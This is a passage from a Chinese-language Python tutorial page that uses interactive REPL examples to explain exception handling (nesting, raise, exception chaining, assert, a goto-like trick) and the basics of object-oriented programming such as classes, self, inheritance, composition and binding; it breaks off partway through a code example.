<h4 id="16-39-4-异常的嵌套"><a href="#16-39-4-异常的嵌套" class="headerlink" title="16.39.4 异常的嵌套"></a>16.39.4 异常的嵌套</h4><p>异常也是可以被嵌套的：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; try:</span><br><span class="line">...     try:</span><br><span class="line">...         520 + &quot;FishC&quot;</span><br><span class="line">...     except:</span><br><span class="line">...         print(&quot;内部异常！&quot;)</span><br><span class="line">...     1 / 0</span><br><span class="line">... except:</span><br><span class="line">...     print(&quot;外部异常！&quot;)</span><br><span class="line">... finally:</span><br><span class="line">...     print(&quot;收尾工作~&quot;)</span><br><span class="line">... </span><br><span class="line">内部异常！</span><br><span class="line">外部异常！</span><br><span class="line">收尾工作~</span><br></pre></td></tr></table></figure></p>
<h4 id="16-39-5-raise-语句"><a href="#16-39-5-raise-语句" class="headerlink" title="16.39.5 raise 语句"></a>16.39.5 raise 语句</h4><p>使用 raise 语句，我们可以手动的引发异常：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; raise ValueError(&quot;值不正确。&quot;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#23&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    raise ValueError(&quot;值不正确。&quot;)</span><br><span class="line">ValueError: 值不正确。</span><br></pre></td></tr></table></figure><br><strong>注意，你不能够 <code>raise</code> 一个并不存在的异常哈：</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; raise FishCError(&quot;小甲鱼说你不行你就不行~&quot;)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#31&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    raise FishCError(&quot;小甲鱼说你不行你就不行~&quot;)</span><br><span class="line">NameError: name &#x27;FishCError&#x27; is not defined</span><br></pre></td></tr></table></figure></p>
<p>由于这个 <code>FishCError</code> 未定义，所以是小甲鱼不行，不是你不行~</p>
<p>还有一种叫异常链，在 <code>raise</code> 后面加个 <code>from</code>:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; raise ValueError(&quot;这样可不行~&quot;) from ZeroDivisionError</span><br><span class="line">ZeroDivisionError</span><br><span class="line"></span><br><span class="line">The above exception was the direct cause of the following exception:</span><br><span class="line"></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#37&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    raise ValueError(&quot;这样可不行~&quot;) from ZeroDivisionError</span><br><span class="line">ValueError: 这样可不行~</span><br></pre></td></tr></table></figure></p>
<h4 id="16-39-6-assert-语句"><a href="#16-39-6-assert-语句" class="headerlink" title="16.39.6 assert 语句"></a>16.39.6 assert 语句</h4><p><code>assert</code> 语句跟 <code>raise</code> 类似，都是主动引发异常，不过 <code>assert</code> 语句只能引发一个叫 <code>AssertionError</code> 的异常。</p>
<p>这个语句的存在意义，通常是用于代码调试：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; s = &quot;FishC&quot;</span><br><span class="line">&gt;&gt;&gt; assert s == &quot;FishC&quot; # 得到期待的结果，通过</span><br><span class="line">&gt;&gt;&gt; assert s != &quot;FishC&quot; # 没有得到期待的结果，引发异常</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#72&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    assert s != &quot;FishC&quot;</span><br><span class="line">AssertionError</span><br></pre></td></tr></table></figure></p>
<h4 id="16-39-7-利用异常来实现-goto"><a href="#16-39-7-利用异常来实现-goto" class="headerlink" title="16.39.7 利用异常来实现 goto"></a>16.39.7 利用异常来实现 goto</h4><p>有学过 C 语言的同学应该听到过一个叫做 goto 的语句，虽然用的不多，但有时候，有这么一个可以指哪跳哪的功能，可以说是非常方便，比如说要在多个嵌套循环语句里面一把跳出来，就非常方便了……可惜 Python 没有！<br>但是，小甲鱼今天敢把话题撂在这，那就说明小甲鱼有想法了！</p>
<p>没错，通过异常，我们完全可以实现：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; try:</span><br><span class="line">...     while True:</span><br><span class="line">...         while True:</span><br><span class="line">...             for i in range(10):</span><br><span class="line">...                 if i &gt; 3:</span><br><span class="line">...                     raise</span><br><span class="line">...                 print(i)</span><br><span class="line">...             print(&quot;被跳过~&quot;)</span><br><span class="line">...         print(&quot;被跳过~&quot;)</span><br><span class="line">...     print(&quot;被跳过~&quot;)</span><br><span class="line">... except:</span><br><span class="line">...     print(&quot;到这儿来~&quot;)</span><br><span class="line">... </span><br><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">到这儿来~</span><br></pre></td></tr></table></figure></p>
<h3 id="16-40-面向对象编程（OOP，Object-Oriented-Programming）"><a href="#16-40-面向对象编程（OOP，Object-Oriented-Programming）" class="headerlink" title="16.40 面向对象编程（OOP，Object-Oriented Programming）"></a>16.40 面向对象编程（OOP，Object-Oriented Programming）</h3><p>所谓的面向对象编程，想要学好它，唯一的捷径就是像造物者一样去思考问题。因为，面向对象最初的灵感就是来源于真实世界：</p>
<p><strong>对象 = 属性（对象的静态特征）+ 方法（所能做的事情）</strong></p>
<h4 id="16-40-1-类和对象"><a href="#16-40-1-类和对象" class="headerlink" title="16.40.1 类和对象"></a>16.40.1 类和对象</h4><p>对象诞生之前，需要先创建一个类，再通过类来创造实际的对象。</p>
<p>创建一个类需要用到 class 关键字：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">class Turtle:</span><br><span class="line">    head = 1</span><br><span class="line">    eyes = 2</span><br><span class="line">    legs = 4</span><br><span class="line">    shell = True</span><br><span class="line">    </span><br><span class="line">    def crawl(self):</span><br><span class="line">        print(&quot;人们总抱怨我动作慢吞吞的，殊不知如不积硅步，无以至千里的道理。&quot;)</span><br><span class="line">    </span><br><span class="line">    def run(self):</span><br><span class="line">        print(&quot;虽然我行动很慢，但如果遇到危险，还是会夺命狂奔的T_T&quot;)</span><br><span class="line">    </span><br><span class="line">    def bite(self):</span><br><span class="line">        print(&quot;人善被人欺，龟善被人骑，我可是会咬人的！&quot;)</span><br><span class="line">    </span><br><span class="line">    def eat(self):</span><br><span class="line">        print(&quot;谁知盘中餐粒粒皆辛苦，吃得好，不如吃得饱~&quot;)</span><br><span class="line">    </span><br><span class="line">    def sleep(self):</span><br><span class="line">        print(&quot;Zzzz...&quot;)</span><br></pre></td></tr></table></figure></p>
<p>类名的命名方式有一个约定俗成的标准，那就是使用大写字母开头，比如我们这里的 Turtle。<br>其实所谓的属性，就是写在类里面的变量，方法就是写在类里面的函数（实际上会有一点区别，后面我们会有仔细讲解）。<br>使用类名搭配上一对小括号，就像调用函数那样，就可以生成一个基于这个类的对象。</p>
<p>t1 就是一个 Turtle 类的对象，也叫实例对象（instance object），它就拥有了这个类所定义的属性和方法：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; t1 = Turtle()</span><br><span class="line">&gt;&gt;&gt; t1.head</span><br><span class="line">1</span><br><span class="line">&gt;&gt;&gt; t1.legs</span><br><span class="line">4</span><br><span class="line">&gt;&gt;&gt; t1.crawl()</span><br><span class="line">人们总抱怨我动作慢吞吞的，殊不知如不积硅步，无以至千里的道理。</span><br><span class="line">&gt;&gt;&gt; t1.bite()</span><br><span class="line">人善被人欺，龟善被人骑，我可是会咬人的！</span><br><span class="line">&gt;&gt;&gt; t1.sleep()</span><br><span class="line">Zzzz...</span><br><span class="line">&gt;&gt;&gt; t2 = Turtle()</span><br><span class="line">&gt;&gt;&gt; t2.head</span><br><span class="line">1</span><br><span class="line">&gt;&gt;&gt; t2.legs</span><br><span class="line">4</span><br><span class="line">&gt;&gt;&gt; t2.crawl()</span><br><span class="line">人们总抱怨我动作慢吞吞的，殊不知如不积硅步，无以至千里的道理。</span><br><span class="line">&gt;&gt;&gt; t2.bite()</span><br><span class="line">人善被人欺，龟善被人骑，我可是会咬人的！</span><br></pre></td></tr></table></figure></p>
<p>当对象创建出来之后，我们可以随意修改它的属性值：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; t2.legs = 3</span><br><span class="line">&gt;&gt;&gt; t2.legs</span><br><span class="line">3</span><br><span class="line">&gt;&gt;&gt; t1.legs</span><br><span class="line">4</span><br></pre></td></tr></table></figure></p>
<p>我们也可以动态的创建一个属性，这跟在字典中添加一个新的键值对一样：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; t1.mouth = 1</span><br><span class="line">&gt;&gt;&gt; t1.mouth</span><br><span class="line">1</span><br></pre></td></tr></table></figure></p>
<p>使用 dir() 函数，可以看到，t1 比 t2 多出了一个 mouth 的属性：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; dir(t1)</span><br><span class="line">[&#x27;__class__&#x27;, &#x27;__delattr__&#x27;, &#x27;__dict__&#x27;, &#x27;__dir__&#x27;, &#x27;__doc__&#x27;, &#x27;__eq__&#x27;, &#x27;__format__&#x27;, &#x27;__ge__&#x27;, &#x27;__getattribute__&#x27;, &#x27;__gt__&#x27;, &#x27;__hash__&#x27;, &#x27;__init__&#x27;, &#x27;__init_subclass__&#x27;, &#x27;__le__&#x27;, &#x27;__lt__&#x27;, &#x27;__module__&#x27;, &#x27;__ne__&#x27;, &#x27;__new__&#x27;, &#x27;__reduce__&#x27;, &#x27;__reduce_ex__&#x27;, &#x27;__repr__&#x27;, &#x27;__setattr__&#x27;, &#x27;__sizeof__&#x27;, &#x27;__str__&#x27;, &#x27;__subclasshook__&#x27;, &#x27;__weakref__&#x27;, &#x27;bite&#x27;, &#x27;crawl&#x27;, &#x27;eat&#x27;, &#x27;eyes&#x27;, &#x27;head&#x27;, &#x27;legs&#x27;, &#x27;mouth&#x27;, &#x27;run&#x27;, &#x27;shell&#x27;, &#x27;sleep&#x27;]</span><br><span class="line">&gt;&gt;&gt; dir(t2)</span><br><span class="line">[&#x27;__class__&#x27;, &#x27;__delattr__&#x27;, &#x27;__dict__&#x27;, &#x27;__dir__&#x27;, &#x27;__doc__&#x27;, &#x27;__eq__&#x27;, &#x27;__format__&#x27;, &#x27;__ge__&#x27;, &#x27;__getattribute__&#x27;, &#x27;__gt__&#x27;, &#x27;__hash__&#x27;, &#x27;__init__&#x27;, &#x27;__init_subclass__&#x27;, &#x27;__le__&#x27;, &#x27;__lt__&#x27;, &#x27;__module__&#x27;, &#x27;__ne__&#x27;, &#x27;__new__&#x27;, &#x27;__reduce__&#x27;, &#x27;__reduce_ex__&#x27;, &#x27;__repr__&#x27;, &#x27;__setattr__&#x27;, &#x27;__sizeof__&#x27;, &#x27;__str__&#x27;, &#x27;__subclasshook__&#x27;, &#x27;__weakref__&#x27;, &#x27;bite&#x27;, &#x27;crawl&#x27;, &#x27;eat&#x27;, &#x27;eyes&#x27;, &#x27;head&#x27;, &#x27;legs&#x27;, &#x27;run&#x27;, &#x27;shell&#x27;, &#x27;sleep&#x27;]</span><br></pre></td></tr></table></figure></p>
<h4 id="16-40-2-封装"><a href="#16-40-2-封装" class="headerlink" title="16.40.2  封装"></a>16.40.2  封装</h4><p>封装，是面向对象编程的三个基本特征之一，另外两个是继承和多态，我们在后续的课程会给大家讲解。<br>像前面我们定义的 Turtle 类，它就把一个甲鱼的特征属性和行为能力封装到了一起。<br>当然，只要有时间，我们还可以添加更多的细节，使得这个 Turtle 更像一只真正意义上的甲鱼。</p>
<h4 id="16-40-3-self-是什么？"><a href="#16-40-3-self-是什么？" class="headerlink" title="16.40.3 self 是什么？"></a>16.40.3 self 是什么？</h4><p>我们编写一段代码，把 self 给打印出来：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class C:</span><br><span class="line">...     def get_self(self):</span><br><span class="line">...         print(self)</span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; c = C()</span><br><span class="line">&gt;&gt;&gt; c.get_self()</span><br><span class="line">&lt;__main__.C object at 0x0000020C981BF0D0&gt;</span><br></pre></td></tr></table></figure></p>
<p>这是什么？<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这就是类 [backcolor=#eee]C[/backcolor] 的实例对象小 [backcolor=#eee]c[/backcolor]：</span><br><span class="line">&gt;&gt;&gt; c</span><br><span class="line">&lt;__main__.C object at 0x0000020C981BF0D0&gt;</span><br></pre></td></tr></table></figure></p>
<p>原来传递给方法的是对象本身，那为什么要这么做呢？<br>我们知道，同一个类可以生成无数多个对象，那么当我们在调用类里面的一个方法的时候，Python 如何知道到底是哪个对象在调用呢？</p>
<p>没错，就是通过这个 self 参数传递的信息。<br>所以，类中的每一个方法，默认的第一个参数都是 self。</p>
<h4 id="16-40-4-继承"><a href="#16-40-4-继承" class="headerlink" title="16.40.4 继承"></a>16.40.4 继承</h4><p>Python 的类是支持继承的：它可以使用现有类的所有功能，并在无需重新编写代码的情况下对这些功能进行扩展。<br>通过继承创建的新类称为 “子类”，被继承的类称为 “父类”、“基类” 或 “超类”。<br>继承语法是将父类写在子类类名后面的小括号中：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class A:</span><br><span class="line">...     x = 520</span><br><span class="line">...</span><br><span class="line">...     def hello(self):</span><br><span class="line">...         print(&quot;你好，我是A~&quot;)</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; class B(A):</span><br><span class="line">...     pass</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; b = B()</span><br><span class="line">&gt;&gt;&gt; b.x</span><br><span class="line">520</span><br><span class="line">&gt;&gt;&gt; b.hello()</span><br><span class="line">你好，我是A~</span><br></pre></td></tr></table></figure><br>基于上面代码的继承关系，类 A 就是父类，类 B 则是子类。</p>
<p>如果在子类 B 里面，存在跟父类 A 一样的属性和方法名，那么子类就会覆盖父类：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class B(A):</span><br><span class="line">...     x = 880</span><br><span class="line">...</span><br><span class="line">...     def hello(self):</span><br><span class="line">...         print(&quot;你好，我是B~&quot;)</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; b = B()</span><br><span class="line">&gt;&gt;&gt; b.x</span><br><span class="line">880</span><br><span class="line">&gt;&gt;&gt; b.hello()</span><br><span class="line">你好，我是B~</span><br></pre></td></tr></table></figure></p>
<h4 id="16-40-5-isinstance-和-issubclass"><a href="#16-40-5-isinstance-和-issubclass" class="headerlink" title="16.40.5 isinstance() 和 issubclass()"></a>16.40.5 isinstance() 和 issubclass()</h4><p><a target="_blank" rel="noopener" href="https://fishc.com.cn/thread-212950-1-1.html">isinstance()</a> 函数用于判断一个对象是否属于某个类。<br><a target="_blank" rel="noopener" href="https://fishc.com.cn/thread-212963-1-1.html">issubclass()</a> 函数用于判断一个类是否属于某个类的子类。<br>友情提示：</p>
<p>在还没有学习 <a target="_blank" rel="noopener" href="https://fishc.com.cn/thread-212950-1-1.html">isinstance()</a> 函数之前，我们使用 <a target="_blank" rel="noopener" href="https://fishc.com.cn/thread-220218-1-1.html">type()</a> 函数判断对象的类型，其实这对 <a target="_blank" rel="noopener" href="https://fishc.com.cn/thread-220218-1-1.html">type()</a>  函数来说真有点大材小用了（type 其实是 Python 中的神）。<br>对于检测对象类型（也就是检测对象所属的类）这件小事来说，使用 <a target="_blank" rel="noopener" href="https://fishc.com.cn/thread-212950-1-1.html">isinstance()</a> 函数无疑是更名副其实的！<br>另外，使用 <a target="_blank" rel="noopener" href="https://fishc.com.cn/thread-212950-1-1.html">isinstance()</a> 函数还会将父类考虑进去：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class A:</span><br><span class="line">...     pass</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; class B(A):</span><br><span class="line">...     pass</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; b = B()</span><br><span class="line">&gt;&gt;&gt; isinstance(b, B)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; isinstance(b, A)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; type(b)</span><br><span class="line">&lt;class &#x27;__main__.B&#x27;&gt;</span><br></pre></td></tr></table></figure></p>
<h4 id="16-40-6-多重继承"><a href="#16-40-6-多重继承" class="headerlink" title="16.40.6 多重继承"></a>16.40.6 多重继承</h4><p>Python 的类是支持多重继承的，也就是一个子类同时可以继承多个父类：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class A:</span><br><span class="line">...     x = 520</span><br><span class="line">...     def hello(self):</span><br><span class="line">...         print(&quot;你好，我是A~&quot;)</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; class B:</span><br><span class="line">...     x = 880</span><br><span class="line">...     y = 250</span><br><span class="line">...     def hello(self):</span><br><span class="line">...         print(&quot;你好，我是B~&quot;)</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; class C(A, B):</span><br><span class="line">...     pass</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; issubclass(C, A)</span><br><span class="line">True</span><br><span class="line">&gt;&gt;&gt; issubclass(C, B)</span><br><span class="line">True</span><br></pre></td></tr></table></figure></p>
<p>如果实例化一个类 C 的对象为 c，那么访问 c.x 和调用 c.hello() 得到的结果分别是：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; c = C()</span><br><span class="line">&gt;&gt;&gt; c.x</span><br><span class="line">520</span><br><span class="line">&gt;&gt;&gt; c.y</span><br><span class="line">250</span><br><span class="line">&gt;&gt;&gt; c.hello()</span><br><span class="line">你好，我是A~</span><br></pre></td></tr></table></figure><br>从例子中可以看出，对于多个父类拥有相同属性和方法的情况，它的访问顺序是按从左到右的。</p>
<h4 id="16-40-7-组合"><a href="#16-40-7-组合" class="headerlink" title="16.40.7 组合"></a>16.40.7 组合</h4><p>类的组合跟继承不同，继承是具有上下从属关系，而组合的多个类则是同级关系，下面代码演示的就是类的组合：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class Turtle:</span><br><span class="line">...     def say(self):</span><br><span class="line">...         print(&quot;不积跬步，无以至千里！&quot;)</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; class Cat:</span><br><span class="line">...     def say(self):</span><br><span class="line">...         print(&quot;喵喵喵~&quot;)</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; class Dog:</span><br><span class="line">...     def say(self):</span><br><span class="line">...         print(&quot;哟吼，我是一只小狗~&quot;)</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; class Garden:</span><br><span class="line">...     t = Turtle()</span><br><span class="line">...     c = Cat()</span><br><span class="line">...     d = Dog()</span><br><span class="line">...     def say(self):</span><br><span class="line">...         self.t.say()</span><br><span class="line">...         self.c.say()</span><br><span class="line">...         self.d.say()</span><br><span class="line">...                </span><br><span class="line">&gt;&gt;&gt; g = Garden()</span><br><span class="line">&gt;&gt;&gt; g.say()</span><br><span class="line">不积跬步，无以至千里！</span><br><span class="line">喵喵喵~</span><br><span class="line">哟吼，我是一只小狗~</span><br></pre></td></tr></table></figure></p>
<h4 id="16-40-8-绑定"><a href="#16-40-8-绑定" class="headerlink" title="16.40.8 绑定"></a>16.40.8 绑定</h4><p>如16.40.8的、末尾的案例，为什么要加上：<code>self</code>?<br>如果没有加上<code>self</code>,代码就会报错:<br><figure class="highlight plaintext"><figcaption><span>class Garden:</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">...     t = Turtle()</span><br><span class="line">...     c = Cat()</span><br><span class="line">...     d = Dog()</span><br><span class="line">...     def say(self):</span><br><span class="line">...         t.say()</span><br><span class="line">...         c.say()</span><br><span class="line">...         d.say()</span><br><span class="line">...                </span><br><span class="line">&gt;&gt;&gt; g = Garden()</span><br><span class="line">&gt;&gt;&gt; g.say()</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File &quot;&lt;pyshell#27&gt;&quot;, line 1, in &lt;module&gt;</span><br><span class="line">    g.say()</span><br><span class="line">  File &quot;&lt;pyshell#25&gt;&quot;, line 6, in say</span><br><span class="line">    t.say()</span><br><span class="line">NameError: name &#x27;t&#x27; is not defined</span><br></pre></td></tr></table></figure></p>
<p>想要弄清楚这个问题，我们就需要知道这个 <code>self</code> 到底是用来干嘛的？</p>
<p>在讲解类和对象第一节课的最后，这个 self 其实就是实例对象本身，当时我们求证的代码是这么写的：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class C:</span><br><span class="line">...     def get_self(self):</span><br><span class="line">...         print(self)</span><br><span class="line">... </span><br><span class="line">&gt;&gt;&gt; c = C()</span><br><span class="line">&gt;&gt;&gt; c.get_self()</span><br><span class="line">&lt;__main__.C object at 0x0000029F9E332850&gt;</span><br><span class="line">&gt;&gt;&gt; c</span><br><span class="line">&lt;__main__.C object at 0x0000029F9E332850&gt;</span><br></pre></td></tr></table></figure></p>
<p>这里利用实例对象调用方法时，会自动传递 self 参数的原理，我们将 self 参数的值打印出来之后，知道它其实就是实例对象本身。<br>其实呢，这个 self 起到的作用就是俩字 —— 绑定。跟谁绑定？</p>
<p>没错，就是实例对象跟类的方法进行绑定！</p>
<p>因为类的实例对象可以有千千万，但这些实例对象却是共享类里面的方法，所以当我们在调用实例 c.get_self() 的时候，其实际的含义是调用类 C 的 get_self() 方法，并将实例对象作为参数给传递进去，进而实现绑定：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; C.get_self(c)</span><br><span class="line">&lt;__main__.C object at 0x0000029F9E332850&gt;</span><br></pre></td></tr></table></figure><br>这个绑定就像是骑共享单车，共享单车就是公共的方法，谁去骑它，那么就需要通过手机扫码绑定（这样它就知道在谁的钱包里扣钱了）。所以，现在大家应该知道绑定的必要性了吧！</p>
<h4 id="16-40-9-只要通过绑定，就可以实现各个对象设置各个对象的属性"><a href="#16-40-9-只要通过绑定，就可以实现各个对象设置各个对象的属性" class="headerlink" title="16.40.9 只要通过绑定，就可以实现各个对象设置各个对象的属性"></a>16.40.9 只要通过绑定，就可以实现各个对象设置各个对象的属性</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; class C:</span><br><span class="line">...     x = 100</span><br><span class="line">...     def set_x(self, v):</span><br><span class="line">...         self.x = v</span><br><span class="line">...                </span><br><span class="line">&gt;&gt;&gt; c1 = C()</span><br><span class="line">&gt;&gt;&gt; c2 = C()</span><br><span class="line">&gt;&gt;&gt; c1.x</span><br><span class="line">100</span><br><span class="line">&gt;&gt;&gt; c2.x</span><br><span class="line">100</span><br><span class="line">&gt;&gt;&gt; c1.set_x(250)</span><br><span class="line">&gt;&gt;&gt; c1.x</span><br><span class="line">250</span><br><span class="line">&gt;&gt;&gt; c2.set_x(520)</span><br><span class="line">&gt;&gt;&gt; c2.x</span><br><span class="line">520</span><br><span 